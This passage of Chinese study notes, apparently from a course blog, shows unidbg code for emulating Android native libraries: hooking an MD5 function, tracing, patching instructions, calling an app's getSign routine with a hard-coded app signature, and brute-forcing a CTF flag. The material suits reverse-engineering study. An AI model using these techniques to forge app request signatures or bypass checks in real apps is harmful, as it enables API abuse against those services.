class="type">long</span> address, <span class="type">int</span> size, Object user)</span> &#123;</span><br><span class="line">                RegisterContext context=emulator.getContext();</span><br><span class="line">                <span class="keyword">if</span>(address== <span class="keyword">module</span>.base+<span class="number">0x1FF4</span>)&#123;</span><br><span class="line">                    Pointer md5_ctx=context.getPointerArg(<span class="number">0</span>);</span><br><span class="line">                    Inspector.inspect(md5_ctx.getByteArray(<span class="number">0</span>,<span class="number">32</span>),<span class="string">&quot;md5_ctx&quot;</span>);</span><br><span class="line">                    Pointer plainText=context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                    <span class="type">int</span> length=context.getIntArg(<span class="number">2</span>);</span><br><span class="line">                    Inspector.inspect(plainText.getByteArray(<span class="number">0</span>,length),<span class="string">&quot;plainText&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(address== <span class="keyword">module</span>.base+<span class="number">0x2004</span>)&#123;</span><br><span class="line">                    Pointer cipherText=context.getPointerArg(<span class="number">1</span>);</span><br><span class="line">                    Inspector.inspect(cipherText.getByteArray(<span class="number">0</span>,<span class="number">16</span>),<span class="string">&quot;cipherText&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onAttach</span><span class="params">(UnHook unHook)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">detach</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,<span class="keyword">module</span>.base+<span class="number">0x1FE8</span>, <span class="keyword">module</span>.base+<span class="number">0x2004</span>,<span class="literal">null</span> );  <span class="comment">//md5函数中汇编指令</span></span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result.getValue());</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="打印调用栈"><a href="#打印调用栈" class="headerlink" title="打印调用栈"></a>打印调用栈</h3><p>xjb32课时</p><p><code>emulator.getUnwinder().unwind();</code></p><h3 id="unidbg中的动态调式"><a href="#unidbg中的动态调式" class="headerlink" title="unidbg中的动态调式"></a>unidbg中的动态调式</h3><ul><li><p>基于unicorn的console debuger 同样不需要管地址 +1</p></li><li><p>附加下断点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Debugger</span> <span class="variable">debugger</span> <span class="operator">=</span> emulator.attach();</span><br><span class="line">debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x1AF4</span>);</span><br><span class="line">debugger.addBreakPoint(<span class="keyword">module</span>.base+<span class="number">0x1AF8</span>);</span><br></pre></td></tr></table></figure></li><li><p>b：下端点 b0x地址 </p></li><li><p>m：读内存 mx0</p></li><li><p>bt：查看函数栈</p></li><li><p>w：写寄存器</p></li></ul><h3 id="监控内存读写"><a href="#监控内存读写" class="headerlink" title="监控内存读写"></a>监控内存读写</h3><p>xjb第34课时</p><ul><li>将信息输出到文件</li></ul><p><code>String traceFile=&quot;yourpath&quot;;</code><br><code>PrintStream traceStream = new PrintStream(new FileOutputStream(traceFile),true);</code></p><ul><li>监控内存读</li></ul><p><code>emulator.traceRead(module.base, module.base+ module.size).setRedirect(traceStream);</code></p><p>setRedirect(traceStream) 重定向到traceStream</p><ul><li>监控内存写</li></ul><p><code>emulator.traceWrite(module.base, module.base+ module.size).setRedirect(traceStream);</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">String traceFile=<span class="string">&quot;yourpath&quot;</span>;   <span class="comment">//写入yourpath文件</span></span><br><span class="line">       <span class="type">PrintStream</span> <span class="variable">traceStream</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           traceStream = <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(traceFile),<span class="literal">true</span>);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">       &#125;</span><br><span class="line">       emulator.traceRead(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line">       emulator.traceWrite(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line">       <span class="type">StringObject</span> <span class="variable">md5Result</span> <span class="operator">=</span> NativeHelper.callStaticJniMethodObject(emulator, <span class="string">&quot;md5(Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;xiaojianbang&quot;</span>)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">       System.out.println(<span class="string">&quot;md5Result: &quot;</span> + md5Result.getValue());</span><br></pre></td></tr></table></figure><h3 id="unidbg-trace"><a href="#unidbg-trace" class="headerlink" title="unidbg trace"></a>unidbg trace</h3><p>记录代码真正执行的指令和寄存器的状态</p><p>代码写法（基本）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> String traceFile=<span class="string">&quot;yourpath&quot;</span>;</span><br><span class="line">        <span class="type">PrintStream</span> <span class="variable">traceStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span>        <span class="title class_">FileOutputStream</span>(traceFile),<span class="literal">true</span>);</span><br><span class="line">        emulator.traceCode(<span class="keyword">module</span>.base, <span class="keyword">module</span>.base+ <span class="keyword">module</span>.size).setRedirect(traceStream);</span><br><span class="line"></span><br><span class="line"><span class="comment">//setRedirect(traceStream); 重定向</span></span><br></pre></td></tr></table></figure><h3 id="unidbg-patch"><a href="#unidbg-patch" class="headerlink" title="unidbg patch"></a>unidbg patch</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span>UnidbgPointer.pointer(emulator,目标地址);</span><br><span class="line"><span class="type">byte</span>[] code=<span class="keyword">new</span> <span class="title class_">byte</span>[]&#123;<span class="number">0x1</span>,<span class="number">0x2</span>&#125;;</span><br><span class="line">pointer.write(code);</span><br></pre></td></tr></table></figure><p>使用脚本自动把汇编代码变为机器码，然后patch</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">UnidbgPointer</span> <span class="variable">pointer</span> <span class="operator">=</span>UnidbgPointer.pointer(emulator,目标地址);</span><br><span class="line"><span class="type">Keystone</span> <span class="variable">keystone</span> <span class="operator">=</span><span class="keyword">new</span> <span class="title class_">Keystone</span>(KeystoneArchitecture.Arm,KeystoneMode.ArmThumb);</span><br><span class="line">String s=<span class="string">&quot;subs r0,r2,r3&quot;</span>;</span><br><span class="line"><span class="type">byte</span>[] code=keystone.assemble(s).getMachineCode();</span><br><span class="line">pointer.write(code);</span><br></pre></td></tr></table></figure><h3 id="处理so调用自写的Java类1"><a href="#处理so调用自写的Java类1" class="headerlink" title="处理so调用自写的Java类1"></a>处理so调用自写的Java类1</h3><p>xjb37课时</p><ul><li>将自写的java类 放到unidbg工程中</li><li>包名最好与原包名一致</li><li>类中有用到android相关类 需要用Java实现</li><li>代码不需要完全一致 只需函数处理结果符合预期即可</li><li>访问修饰符的问题<br>1.JNI调用Java函数不需要理会访问修饰符<br>2.unidbg用Java开发 在调用函数时需要注意访问修饰符<br>3.解决方法可以用反射 或者直接将private改为public</li></ul><h3 id="Unidbg案例"><a href="#Unidbg案例" class="headerlink" title="Unidbg案例"></a>Unidbg案例</h3><p>xjb第41课时</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">void</span> <span class="title function_">callFunc</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//方法一</span></span><br><span class="line"><span class="comment">//        emulator.getBackend().hook_add_new(new CodeHook() &#123;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void hook(Backend backend, long address, int size, Object user) &#123;</span></span><br><span class="line"><span class="comment">//                //当执行到0xABE执行这个回调函数：修改PC寄存器使他跳过 4+1(Thumb)字节码 执行下一个汇编代码</span></span><br><span class="line"><span class="comment">//                emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC,address+4+1);</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void onAttach(UnHook unHook) &#123;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//            @Override</span></span><br><span class="line"><span class="comment">//            public void detach() &#123;</span></span><br><span class="line"><span class="comment">//            &#125;</span></span><br><span class="line"><span class="comment">//        &#125;,module.base+0xABE,module.base+0xABE,null);</span></span><br><span class="line">        <span class="comment">//方法二 断点</span></span><br><span class="line">     </span><br><span class="line">        emulator.attach().addBreakPoint(<span class="keyword">module</span>.base + <span class="number">0xABE</span>, <span class="keyword">new</span> <span class="title class_">BreakPointCallback</span>() &#123;</span><br><span class="line">            <span class="comment">//获取r1寄存器指针</span></span><br><span class="line">           <span class="comment">// UnidbgPointer                 pointer=UnidbgPointer.register(emulator,ArmConst.UC_ARM_REG_R1) ==》pointer.getString(0)</span></span><br><span class="line">            </span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onHit</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="type">long</span> address)</span> &#123;</span><br><span class="line">                emulator.getBackend().reg_write(ArmConst.UC_ARM_REG_PC,address+<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">                <span class="comment">//false：在断点处停下 true：不会停在断点处</span></span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">     </span><br><span class="line">        String data=<span class="string">&quot;1636221462621&quot;</span>;</span><br><span class="line">        <span class="type">StringObject</span> <span class="variable">strResult</span> <span class="operator">=</span> SignManager.callStaticJniMethodObject(emulator, <span class="string">&quot;getSign(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;&quot;</span>, <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;&quot;</span>), <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;&quot;</span>), <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, data)); <span class="comment">// 执行Jni方法</span></span><br><span class="line">        System.out.println(strResult);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//补环境</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> DvmObject&lt;?&gt; callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="string">&quot;com/sichuanol/cbgc/util/LogShutDown-&gt;getAppSign()Ljava/lang/String;&quot;</span>.equals(signature))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, <span class="string">&quot;0093CB6721DAF15D31CFBC9BBE3A2B79&quot;</span>);  <span class="comment">//包装返回值</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.callStaticObjectMethodV(vm, dvmClass, signature, vaList);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="unidbg中的VirtualModule"><a href="#unidbg中的VirtualModule" class="headerlink" title="unidbg中的VirtualModule"></a>unidbg中的VirtualModule</h3><p>xjb第45课时</p><ul><li>unidbg的虚拟模块功能，可以用来注册虚拟的so，自己实现so中相应的方法</li><li>libandroid.so用于读取app的assests资源</li><li>如果so中需要依赖该libandroid.so 可以注册libandroid.so到内存中<br><code>new AndroidModule(emulator,vm).register(memory);</code></li><li>在unidbg源码的java-&gt;virtualmodule.android-&gt;AndroidMoudle，把他放在相应的.java同包下在进行修改。</li></ul><p>以xjb课程的NativeHelper为例 加载自定义xiaojianbangA.so</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">XiaojianbangAModule</span> <span class="keyword">extends</span> <span class="title class_">VirtualModule</span>&lt;VM&gt; &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">XiaojianbangAModule</span><span class="params">(Emulator&lt;?&gt; emulator, VM vm)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(emulator, vm, <span class="string">&quot;libxiaojianbangA.so&quot;</span>); <span class="comment">//要模拟的so</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onInitialize</span><span class="params">(Emulator&lt;?&gt; emulator, <span class="keyword">final</span> VM vm, Map&lt;String, UnidbgPointer&gt; symbols)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">is64Bit</span> <span class="operator">=</span> emulator.is64Bit();</span><br><span class="line">        <span class="type">SvcMemory</span> <span class="variable">svcMemory</span> <span class="operator">=</span> emulator.getSvcMemory();</span><br><span class="line">        symbols.put(<span class="string">&quot;_Z7bssFuncv&quot;</span>, svcMemory.registerSvc(is64Bit ? <span class="keyword">new</span> <span class="title class_">Arm64Svc</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">handle</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">                fromJava(emulator, vm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; : <span class="keyword">new</span> <span class="title class_">ArmSvc</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="type">long</span> <span class="title function_">handle</span><span class="params">(Emulator&lt;?&gt; emulator)</span> &#123;</span><br><span class="line">                fromJava(emulator, vm);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//加载的内容</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">fromJava</span><span class="params">(Emulator&lt;?&gt; emulator, VM vm)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;libxiaojianbangA.so&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主要java代码中 添加</span></span><br><span class="line"> <span class="keyword">new</span> <span class="title class_">XiaojianbangAModule</span>(emulator, vm).register(memory);</span><br><span class="line"><span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/com/xiaojianbang/ndk/libxiaojianbang.so&quot;</span>), <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><h3 id="unidbg进行爆破求flag"><a href="#unidbg进行爆破求flag" class="headerlink" title="unidbg进行爆破求flag"></a>unidbg进行爆破求flag</h3><p>native为(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;</p><p>通过爆破与已知字符串相比较求flag</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.monkeylord.illusion;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.AndroidEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Emulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.arm.HookStatus;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.HookContext;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.ReplaceCallback;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.hook.hookzz.HookZz;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidARMEmulator;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidEmulatorBuilder;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.AndroidResolver;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.*;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.Module;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.linux.android.dvm.array.ByteArray;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.memory.Memory;</span><br><span class="line"><span class="keyword">import</span> com.github.unidbg.pointer.UnidbgPointer;</span><br><span class="line"><span class="keyword">import</span> com.sun.jna.Pointer;</span><br><span class="line"><span class="keyword">import</span> unicorn.Arm64Const;</span><br><span class="line"><span class="keyword">import</span> unicorn.ArmConst;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">illusion</span> <span class="keyword">extends</span> <span class="title class_">AbstractJni</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> AndroidEmulator emulator;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> VM vm;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Module <span class="keyword">module</span>;</span><br><span class="line">    <span class="keyword">private</span> DvmClass cNative;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> String r0;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">illusion</span> <span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 创建模拟器实例,进程名建议依照实际进程名填写，可以规避针对进程名的校验</span></span><br><span class="line">        emulator = AndroidEmulatorBuilder.for32Bit().setProcessName(<span class="string">&quot;monkeylord.illusion&quot;</span>).build();</span><br><span class="line">        <span class="comment">// 获取模拟器的内存操作接口</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">Memory</span> <span class="variable">memory</span> <span class="operator">=</span> emulator.getMemory();</span><br><span class="line">        <span class="comment">// 设置系统类库解析</span></span><br><span class="line">        memory.setLibraryResolver(<span class="keyword">new</span> <span class="title class_">AndroidResolver</span>(<span class="number">23</span>));</span><br><span class="line">        <span class="comment">// 创建Android虚拟机,传入APK，Unidbg可以替我们做部分签名校验的工作</span></span><br><span class="line"><span class="comment">//        vm =  emulator.createDalvikVM(new File(&quot;unidbg-android/src/test/java/com/test/llusion.apk&quot;));</span></span><br><span class="line">        vm =  emulator.createDalvikVM();</span><br><span class="line">        <span class="comment">// 加载目标SO</span></span><br><span class="line">        <span class="type">DalvikModule</span> <span class="variable">dm</span> <span class="operator">=</span> vm.loadLibrary(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;unidbg-android/src/test/java/com/monkeylord/illusion/libnative-lib.so&quot;</span>), <span class="literal">true</span>); <span class="comment">// 加载so到虚拟内存</span></span><br><span class="line">        <span class="comment">//获取本SO模块的句柄,后续需要用它</span></span><br><span class="line">        <span class="keyword">module</span> = dm.getModule();</span><br><span class="line">        vm.setJni(<span class="built_in">this</span>); <span class="comment">// 设置JNI</span></span><br><span class="line">        vm.setVerbose(<span class="literal">false</span>); <span class="comment">// 打印日志</span></span><br><span class="line"></span><br><span class="line">        dm.callJNI_OnLoad(emulator); <span class="comment">// 调用JNI OnLoad</span></span><br><span class="line">        DvmObject&lt;?&gt; thiz = vm.resolveClass(<span class="string">&quot;monkeylord/illusion/MainActivity&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">illusion</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">illusion</span>();</span><br><span class="line">        test.hook();</span><br><span class="line">        <span class="type">String</span> <span class="variable">flag_enc</span> <span class="operator">=</span> <span class="string">&quot;Ku@&#x27;G_V9v(yGS&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>; index &lt; flag_enc.length(); index++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">33</span>; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">                test.CheckFlag(flag + String.valueOf((<span class="type">char</span>) i), flag_enc);  <span class="comment">// 进行判断</span></span><br><span class="line">                <span class="comment">//System.out.println(illusion.r0.length());</span></span><br><span class="line">                <span class="keyword">if</span> ((illusion.r0.length() &gt; index)  &amp;&amp; (flag_enc.charAt(index) == illusion.r0.charAt(index))) &#123;</span><br><span class="line">                    flag += String.valueOf((<span class="type">char</span>) i);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            System.out.println(<span class="string">&quot;Flag[0:&quot;</span>+index+<span class="string">&quot;]: &quot;</span>+flag);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Completely Flag is: &quot;</span>+flag);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">CheckFlag</span><span class="params">(String flag, String flag_enc)</span> &#123;</span><br><span class="line">        <span class="comment">//创建jobject对象</span></span><br><span class="line">        <span class="comment">//DvmObject&lt;?&gt; thiz = vm.resolveClass(&quot;monkeylord/illusion/MainActivity&quot;).newObject(null);</span></span><br><span class="line"><span class="comment">//        List&lt;Object&gt; list = new ArrayList&lt;&gt;(10);</span></span><br><span class="line"><span class="comment">//        list.add(vm.getJNIEnv());</span></span><br><span class="line"><span class="comment">//        list.add(0);</span></span><br><span class="line"><span class="comment">//        list.add(vm.addLocalObject(new StringObject(vm, flag)));   // arg 3</span></span><br><span class="line"><span class="comment">//        list.add(vm.addLocalObject(new StringObject(vm, flag_enc)));   // arg 4</span></span><br><span class="line">        <span class="comment">//list.toArray()</span></span><br><span class="line">        <span class="type">Number</span> <span class="variable">number</span> <span class="operator">=</span>  <span class="keyword">module</span>.callFunction(emulator, <span class="number">0xdc9</span>, vm.getJNIEnv(),<span class="number">0</span>,vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, flag)),vm.addLocalObject(<span class="keyword">new</span> <span class="title class_">StringObject</span>(vm, flag_enc)));</span><br><span class="line"><span class="comment">//        System.out.print(&quot;result:&quot;);</span></span><br><span class="line"><span class="comment">//        DvmObject&lt;?&gt; object = vm.getObject(number.intValue());</span></span><br><span class="line"><span class="comment">//        System.out.print(object.getValue().toString());</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">hook</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">HookZz</span> <span class="variable">hook</span> <span class="operator">=</span> HookZz.getInstance(emulator);</span><br><span class="line">        hook.replace(<span class="keyword">module</span>.base + <span class="number">0x00000E64</span>+<span class="number">1</span>, <span class="keyword">new</span> <span class="title class_">ReplaceCallback</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> HookStatus <span class="title function_">onCall</span><span class="params">(Emulator&lt;?&gt; emulator, HookContext context, <span class="type">long</span> originFunction)</span> &#123;</span><br><span class="line">                <span class="comment">//System.out.println(context.getPointerArg(0).getString(0));  // 入参1 R0寄存器</span></span><br><span class="line">                illusion.r0 = context.getPointerArg(<span class="number">0</span>).getString(<span class="number">0</span>);</span><br><span class="line">                <span class="comment">//System.out.println(context.getPointerArg(1).getString(0));  // 入参2 R1寄存器</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">super</span>.onCall(emulator, context,originFunction);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;, <span class="literal">true</span>);</span><br><span class="line">    &#125;</span><br><span 